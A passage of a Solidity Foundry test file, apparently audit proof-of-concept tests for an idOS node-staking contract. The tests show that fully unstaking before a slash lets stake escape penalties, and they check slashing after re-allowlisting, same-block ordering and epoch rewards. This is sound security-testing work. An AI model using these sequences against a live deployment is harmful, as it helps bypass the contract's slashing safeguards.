        uint256 ownerBefore = idosToken.balanceOf(owner);
        vm.prank(owner);
        idosStaking.withdrawSlashedStakes();
        assertEq(idosToken.balanceOf(owner) - ownerBefore, userBStake, "owner seized new stake only");

        // Old unstaked funds safe
        skip(idosStaking.UNSTAKE_DELAY() + 1 seconds);
        uint256 victimBefore = idosToken.balanceOf(victim);
        vm.prank(victim);
        idosStaking.withdrawUnstaked();
        assertEq(idosToken.balanceOf(victim) - victimBefore, userAStake, "old stake recovered");

        console.log("F2 Sequence 7: New stake after old unstake escaped");
        console.log("  Old 500 recovered by victim, new 300 slashed");
    }

    // ---------------------------------------------------------------
    // Sequence 8: Owner tries to slash before and after
    //             re-allowlisting (after full unstake)
    // ---------------------------------------------------------------
    function test_F2_Sequence8_SlashBeforeAndAfterReAllowlist() public {
        uint256 stakeAmount = 500;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), stakeAmount);

        vm.prank(victim);
        idosStaking.stake(address(0), nodeA, stakeAmount);

        // Full unstake -> node removed
        vm.prank(victim);
        idosStaking.unstake(nodeA, stakeAmount);

        // Slash fails
        vm.prank(owner);
        vm.expectRevert(abi.encodeWithSignature("NodeIsUnknown(address)", nodeA));
        idosStaking.slash(nodeA);

        // Re-allowlist
        vm.prank(owner);
        idosStaking.allowNode(nodeA);

        // Slash still fails
        vm.prank(owner);
        vm.expectRevert(abi.encodeWithSignature("NodeIsUnknown(address)", nodeA));
        idosStaking.slash(nodeA);

        // New stake comes in
        vm.prank(owner);
        require(idosToken.transfer(attacker, stakeAmount));
        vm.prank(attacker);
        idosToken.approve(address(idosStaking), stakeAmount);
        vm.prank(attacker);
        idosStaking.stake(address(0), nodeA, stakeAmount);

        // Now slash succeeds
        vm.prank(owner);
        idosStaking.slash(nodeA);

        IDOSNodeStaking.NodeStake[] memory slashedNodes_ = idosStaking.getSlashedNodeStakes();
        bool found;
        for (uint256 i = 0; i < slashedNodes_.length; i++) {
            if (slashedNodes_[i].node == nodeA) found = true;
        }
        assertTrue(found, "node slashed after new stake");

        console.log("F2 Sequence 8: Slash fails before and after re-allowlisting");
        console.log("  Only succeeds after new stake is added");
    }

    // ---------------------------------------------------------------
    // Sequence 9: Full unstake and slash in same block -
    //             different tx ordering (Arbitrum simulation)
    // ---------------------------------------------------------------
    function test_F2_Sequence9_FullUnstakeThenSlashSameBlock() public {
        uint256 stakeAmount = 500;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), stakeAmount);

        vm.prank(victim);
        idosStaking.stake(address(0), nodeA, stakeAmount);

        // Unstake then immediately slash in same block (no skip)
        vm.prank(victim);
        idosStaking.unstake(nodeA, stakeAmount);

        // Slash in same block -> should revert since unstake already removed node
        vm.prank(owner);
        vm.expectRevert(abi.encodeWithSignature("NodeIsUnknown(address)", nodeA));
        idosStaking.slash(nodeA);

        console.log("F2 Sequence 9: In same block, unstake before slash prevents slash");
    }

    // ---------------------------------------------------------------
    // Sequence 10: Full unstake immediately before epoch transition
    // ---------------------------------------------------------------
    function test_F2_Sequence10_UnstakeBeforeEpochTransition() public {
        uint256 stakeAmount = 500;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), stakeAmount);

        vm.prank(victim);
        idosStaking.stake(address(0), nodeA, stakeAmount);

        skip(23 hours); // Almost epoch end

        (uint256 rewardBefore,,,) = idosStaking.withdrawableReward(victim);
        console.log("Reward before unstake: %d", rewardBefore);

        // Unstake right before epoch transition
        vm.prank(victim);
        idosStaking.unstake(nodeA, stakeAmount);

        // Advance past epoch boundary
        skip(2 hours); // Now epoch 1

        (uint256 rewardAfter,,,) = idosStaking.withdrawableReward(victim);
        console.log("Reward after epoch transition: %d", rewardAfter);

        console.log("F2 Sequence 10: Unstake before epoch transition");
        console.log("  Reward before:", rewardBefore);
        console.log("  Reward after:", rewardAfter);
    }

    // ---------------------------------------------------------------
    // Sequence 11: Pending unstake - included or excluded from
    //              reward calculations?
    // ---------------------------------------------------------------
    function test_F2_Sequence11_PendingUnstakeRewardInclusion() public {
        uint256 stakeAmount = 1000;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), stakeAmount);

        vm.prank(victim);
        idosStaking.stake(address(0), nodeA, stakeAmount);

        // 1 full epoch passes
        skip(1 days);

        (uint256 rewardBeforeUnstake,,,) = idosStaking.withdrawableReward(victim);
        console.log("Reward before unstake (after 1 epoch): %d", rewardBeforeUnstake);
        assertEq(rewardBeforeUnstake, 100, "100 reward for epoch 0");

        // Partial unstake (500)
        vm.prank(victim);
        idosStaking.unstake(nodeA, 500);

        (uint256 rewardAfterUnstake,,,) = idosStaking.withdrawableReward(victim);
        console.log("Reward after unstake: %d", rewardAfterUnstake);

        // Advance another epoch
        skip(1 days);

        (uint256 rewardAfterEpoch,,,) = idosStaking.withdrawableReward(victim);
        console.log("Reward after another epoch: %d", rewardAfterEpoch);

        console.log("F2 Sequence 11: Pending unstake reward inclusion analysis");
    }

    // ---------------------------------------------------------------
    // Sequence 12: Previously removed node receives new stake ->
    //              later slashed
    // ---------------------------------------------------------------
    function test_F2_Sequence12_RemovedNodeNewStakeThenSlashed() public {
        uint256 oldStake = 500;
        uint256 newStake = 300;

        vm.prank(victim);
        idosToken.approve(address(idosStaking), type(uint256).max);

        // Old user stakes
        vm.prank(victim);
        idosStaking.stake(address(0), nodeA, oldStake);

        // Full unstake -> node removed
        vm.prank(victim);
        idosStaking.unstake(nodeA, oldStake);

        assertEq(idosStaking.getNodeStake(nodeA), 0, "node removed from stakeByNode");

        // New user stakes
        vm.prank(owner);
        require(idosToken.transfer(attacker, newStake));
        vm.prank(attacker);
        idosToken.approve(address(idosStaking), newStake);
        vm.prank(attacker);
        idosStaking.stake(address(0), nodeA, newStake);

        // Node re-enters stakeByNode
        assertEq(idosStaking.getNodeStake(nodeA), newStake, "node re-entered with new stake");

        // Slash succeeds on new stake
        vm.prank(owner);
        idosStaking.slash(nodeA);

        IDOSNodeStaking.NodeStake[] memory slashedNodes_ = idosStaking.getSlashedNodeStakes();
        bool found;
        for (uint256 i = 0; i < slashedNodes_.length; i++) {
            if (slashedNodes_[i].node == nodeA) found = true;
        }
        assertTrue(found, "node slashed");

        // Owner withdraws - only new stake
        uint256 ownerBefore = idosToken.balanceOf(owner);
        vm.prank(owner);
        idosStaking.withdrawSlashedStakes();
        assertEq(idosToken.balanceOf(owner) - ownerBefore, newStake, "owner seized new stake only");

        // Old unstaked funds safe
        skip(idosStaking.UNSTAKE_DELAY() + 1 seconds);
        uint256 victimBefore = idosToken.balanceOf(victim);
        vm.prank(victim);
        idosStaking.withdrawUnstaked();
        assertEq(idosToken.balanceOf(victim) - victimBefore, oldStake, "old stake recovered");

        console.log("F2 Sequence 12: Node removed -> new stake -> slashable again");
        console.log("  Old stake escaped:", oldStake);
        console.log("  New stake slashed:", newStake);
    }
}
